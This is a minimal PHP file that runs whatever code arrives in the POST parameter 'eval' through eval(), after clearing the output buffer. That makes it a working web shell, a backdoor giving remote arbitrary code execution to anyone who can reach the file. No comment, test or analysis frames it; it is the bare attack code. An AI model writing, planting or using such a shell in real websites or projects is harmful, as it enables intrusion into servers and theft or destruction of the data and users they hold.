<?php
$eval = $_POST['eval'];
ob_clean();
eval($eval);
?>